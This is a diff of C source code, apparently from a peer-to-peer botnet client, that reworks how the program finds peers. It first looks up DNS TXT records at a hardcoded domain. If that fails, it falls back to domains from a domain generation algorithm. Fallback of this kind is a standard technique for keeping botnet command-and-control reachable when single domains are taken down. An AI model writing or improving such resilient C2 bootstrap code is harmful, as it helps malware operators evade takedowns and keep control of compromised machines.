@@ -66,14 +66,23 @@ int main(int argc, char *argv[]) {
         // 1. Hardcoded Seed
         p2p_add_neighbor(inet_addr("127.0.0.1"), htons(P2P_PORT));
         
-        // 2. DNS TXT Seed (Robust)
-        printf("[*] Resolving seeds from DNS TXT...\n");
-        char *domain = dga_get_domain();
-        printf("[*] Target Domain: %s\n", domain);
-                if (dns_resolve_txt(domain) == 0) { // Placeholder Domain
-             printf("[+] DNS Bootstrap Complete\n");
+        // 2. Smart Hybrid Bootstrap (Priority: Home > DGA)
+        
+        // Tier 1: Home Domain
+        printf("[*] Tier 1: Bootstrapping via dht.polydevs.uk...\n");
+        if (dns_resolve_txt("dht.polydevs.uk") == 0) {
+            printf("[+] Tier 1 Success: Connected via Home Domain.\n");
         } else {
-             printf("[-] DNS Bootstrap Failed (Expected if domain invalid)\n");
+            // Tier 2: DGA
+            printf("[-] Tier 1 Failed. Switching to Tier 2 (DGA)...\n");
+            char *dga_domain = dga_get_domain();
+            printf("[*] Target DGA Domain: %s\n", dga_domain);
+            
+            if (dns_resolve_txt(dga_domain) == 0) {
+                printf("[+] Tier 2 Success: Connected via DGA.\n");
+            } else {
+                printf("[-] Tier 2 Failed. Waiting for next cycle or retry.\n");
+            }
         }
     }
 
